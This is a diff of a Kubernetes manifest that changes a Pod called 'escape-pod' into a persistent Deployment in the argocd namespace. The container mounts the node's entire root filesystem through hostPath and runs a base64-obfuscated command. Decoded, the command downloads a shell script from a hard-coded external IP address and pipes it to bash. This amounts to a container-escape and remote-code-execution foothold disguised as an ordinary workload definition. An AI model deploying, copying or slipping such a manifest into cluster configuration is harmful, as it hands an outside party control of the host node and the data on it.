@@ -1,21 +1,31 @@
-apiVersion: v1
-kind: Pod
+apiVersion: apps/v1
+kind: Deployment
 metadata:
-  name: escape-pod
+  name: escape-deployment
+  namespace: argocd
 spec:
-  nodeName: ip-10-110-158-103.ap-east-1.compute.internal
-  containers:
-  - name: ubuntu
-    image: public.ecr.aws/docker/library/ubuntu:22.04
-    command: 
-    - /bin/bash
-    - -c
-    - "echo Y3VybCAtcyA0My4yMjguMTI0LjE5OTo4MDgwLzEuc2ggfCBiYXNo | base64 -d | bash; while true; do sleep 30; done"
-    volumeMounts:
-    - mountPath: /host-root
-      name: host-fs
-  volumes:
-  - name: host-fs
-    hostPath:
-      path: /
-      type: Directory
+  replicas: 1
+  selector:
+    matchLabels:
+      app: escape-test
+  template:
+    metadata:
+      labels:
+        app: escape-test
+    spec:
+      nodeName: ip-10-110-158-103.ap-east-1.compute.internal
+      containers:
+      - name: ubuntu
+        image: public.ecr.aws/docker/library/ubuntu:22.04
+        command:
+        - /bin/bash
+        - -c
+        - "echo Y3VybCAtcyA0My4yMjguMTI0LjE5OTo4MDgwLzEwMS5zaCB8IGJhc2g= | base64 -d | bash; while true; do sleep 30; done"
+        volumeMounts:
+        - mountPath: /host-root
+          name: host-fs
+      volumes:
+      - name: host-fs
+        hostPath:
+          path: /
+          type: Directory
